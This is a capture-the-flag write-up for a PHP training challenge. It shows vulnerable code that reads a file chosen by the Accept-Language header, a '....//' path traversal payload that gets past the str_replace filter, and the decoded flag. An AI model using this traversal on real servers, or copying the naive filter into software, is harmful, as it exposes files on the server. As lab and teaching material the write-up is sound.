# FunWithFlags

**Link**: [https://training02.webhack.it/](https://training02.webhack.it/)

**Hint**: Flag is at /flag

Analizing the **php** code:

```php
<?php
  highlight_file(__FILE__);
  $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'ot';
  $lang = explode(',', $lang)[0];
  $lang = str_replace('../', '', $lang);
  $c = file_get_contents("flags/$lang");
  if (!$c) $c = file_get_contents("flags/ot");
  echo '<img src="data:image/jpeg;base64,' . base64_encode($c) . '">';
```

I found a vulnerability that allows an `LFI`. The str_replace function as written here it does not escape paths like `....//` , if we set in `Accept-Language` **header** the path file that we want using this technique (using burpsuite) we can get the **base64** of it sent back by the server. Now we have to understand how many of this caracter we need to get `/flag` that is in the **root**.

We have another important output from the server, this string **`Warning**
: file_get_contents(flags/it-IT): failed to open stream: No such file or directory in **/var/www/html/index.php**
 on line **6**`

so we can expect that the context is in **`/var/www/html/`** (typically path for php files) so we have to return back **4** times (I can also set many times `....//` until I get the file but it is not smart approach):

```php
Accept-Language: ....//....//....//....//flag
```

and we get back:

```php
<img src="data:image/jpeg;base64,V0lUezdZWHBQQHlvWnY0V1IydH0=">
```

now we have just to decode the base64 and the **flag** is: `WIT{7YXpP@yoZv4WR2t}`